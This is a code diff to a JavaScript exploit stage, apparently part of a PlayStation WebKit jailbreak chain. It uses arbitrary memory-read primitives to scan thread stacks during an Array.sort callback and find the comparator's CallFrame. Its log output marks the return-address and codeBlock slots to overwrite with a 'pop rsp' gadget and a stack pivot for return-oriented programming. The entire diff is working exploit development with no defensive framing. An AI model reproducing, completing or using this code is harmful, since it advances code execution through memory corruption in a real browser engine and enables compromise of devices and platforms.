@@ -254,29 +254,43 @@ async function prepare(p) {
         jbmark("SELF-STACKS", "count=" + stacks.length + "-sizes="
             + stacks.map(x => "0x" + x[1].toString(16)).join(","));
 
-        const M0 = 0x13370001, M1 = 0x13370002;
-        const TAG = 0xffff0000;
+        const M0 = 0x13370001, M1 = 0x13370002, TAG = 0xffff0000;
         let comparatorAddr = null;
-        let dump = null;
+        const cand = [];   // callee-slot hits with their CallFrame fields
+
+        // Is v a pointer into some thread stack (a plausible callerFrame)?
+        function inAnyStack(v) {
+            for (const [b, sz] of stacks) {
+                const rel = v.sub32(b);
+                if (rel.hi === 0 && (rel.low >>> 0) < sz && (v.low & 7) === 0) return true;
+            }
+            return false;
+        }
 
         const comparator = function (a, b) {
-            if (dump) return 0;
-            // Find M0 on any stack, then dump a window of qwords around it with
-            // annotations so the real CallFrame layout is readable directly.
+            if (cand.length) return 0;
+            const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
+            const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
+                  b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
             for (const [base, size] of stacks) {
                 const view = array_from_address(base, size);
-                for (let o = 0x40; o + 0x40 <= size; o += 8) {
-                    if (view[o] !== 0x01 || view[o + 1] !== 0x00
-                        || view[o + 2] !== 0x37 || view[o + 3] !== 0x13) continue;
-                    const full = p.read8(base.add32(o));
-                    if ((full.hi >>> 0) !== TAG || (full.low >>> 0) !== (M0 >>> 0)) continue;
-                    const rows = [];
-                    for (let d = -0x40; d <= 0x40; d += 8) {
-                        const v = p.read8(base.add32(o + d));
-                        rows.push([d, v]);
-                    }
-                    dump = { base, o, rows };
-                    return 0;
+                for (let o = 0x18; o + 0x28 <= size; o += 8) {
+                    if (view[o] !== b0 || view[o + 1] !== b1
+                        || view[o + 2] !== b2 || view[o + 3] !== b3) continue;
+                    const slot = base.add32(o);       // callee (CallFrame+0x18)
+                    const full = p.read8(slot);
+                    if (full.low !== lo || (full.hi >>> 0) !== hi) continue;
+                    const cf = base.add32(o - 0x18);
+                    cand.push({
+                        base, o, cf,
+                        caller: p.read8(cf),                 // CallFrame+0x00
+                        retPC:  p.read8(cf.add32(0x08)),     // +0x08 returnPC
+                        codeBlock: p.read8(cf.add32(0x10)),  // +0x10
+                        argc:   p.read8(cf.add32(0x20)),     // +0x20 argCountIncludingThis
+                        arg0:   p.read8(cf.add32(0x30)),     // +0x30
+                        arg1:   p.read8(cf.add32(0x38))      // +0x38
+                    });
+                    if (cand.length >= 10) return 0;
                 }
             }
             return 0;
@@ -288,29 +302,33 @@ async function prepare(p) {
         const arr = [M0, M1];
         arr.sort(comparator);
 
-        if (!dump)
-            throw new Error("selfstack: M0 not found for the window dump");
-        const cLo = comparatorAddr.low >>> 0, cHi = comparatorAddr.hi >>> 0;
-        function annotate(v) {
-            if ((v.hi >>> 0) === TAG && (v.low >>> 0) === (M0 >>> 0)) return "<M0(arg)";
-            if ((v.hi >>> 0) === TAG && (v.low >>> 0) === (M1 >>> 0)) return "<M1(arg)";
-            if (v.low === cLo && (v.hi >>> 0) === cHi) return "<COMPARATOR(callee)";
-            const wk = v.sub32(libSceNKWebKitBase);
-            if (wk.hi === 0 && (wk.low >>> 0) < 0x3673d22 && (wk.low >>> 0) > 0x1000)
-                return "<wk+0x" + (wk.low >>> 0).toString(16) + "(code?)";
-            if ((v.hi >>> 0) >= 0x7 && (v.hi >>> 0) <= 0x9 && (v.low & 7) === 0)
-                return "<stackptr?";
-            if ((v.hi >>> 0) >= 0x8 && (v.hi >>> 0) <= 0x8ff) return "<heap/module?";
-            return "";
+        jbmark("SELF-CAND", "callee-refs=" + cand.length);
+        let good = null;
+        for (let n = 0; n < cand.length; n++) {
+            const c = cand[n];
+            const callerStack = inAnyStack(c.caller);
+            const argcLow = c.argc.low >>> 0;
+            // a real comparator CallFrame: callerFrame is a stack ptr above cf,
+            // argumentCountIncludingThis is small (3 = this,a,b).
+            const looksReal = callerStack && argcLow >= 1 && argcLow <= 0x10;
+            jbmark("SELF-CAND-F", "#" + n + "-cf=0x" + c.cf.toString()
+                + "-caller=0x" + c.caller.toString() + (callerStack ? "(stk)" : "")
+                + "-retPC=0x" + c.retPC.toString()
+                + "-argc=0x" + c.argc.toString()
+                + "-arg0=0x" + c.arg0.toString()
+                + "-looksReal=" + looksReal);
+            if (looksReal && !good) good = c;
         }
-        jbmark("SELF-DUMP-AT", "stack=0x" + dump.base.toString()
-            + "-M0off=0x" + dump.o.toString(16));
-        for (const [d, v] of dump.rows) {
-            const sign = d < 0 ? "-0x" + (-d).toString(16) : "+0x" + d.toString(16);
-            jbmark("SELF-Q", "M0" + sign + " = 0x" + v.toString() + " " + annotate(v));
-        }
-        throw new Error("selfstack window dump complete -- read the SELF-Q lines "
-            + "to place callee/returnPC/args and derive the exact CallFrame.");
+        if (!good)
+            throw new Error("selfstack: " + cand.length + " callee refs, none with "
+                + "callerFrame(stack)+small argc -- see SELF-CAND-F dumps.");
+        jbmark("SELF-LOCATE-OK", "CallFrame cf=0x" + good.cf.toString()
+            + " retSlot=0x" + good.cf.add32(0x08).toString()
+            + " cbSlot=0x" + good.cf.add32(0x10).toString()
+            + " returnPC=0x" + good.retPC.toString()
+            + " -- overwrite retSlot=pop rsp, cbSlot=chain to pivot");
+        throw new Error("selfstack locate OK: CallFrame cf=0x" + good.cf.toString()
+            + ", ret slot ready.");
     }
 
     // -----------------------------------------------------------------------
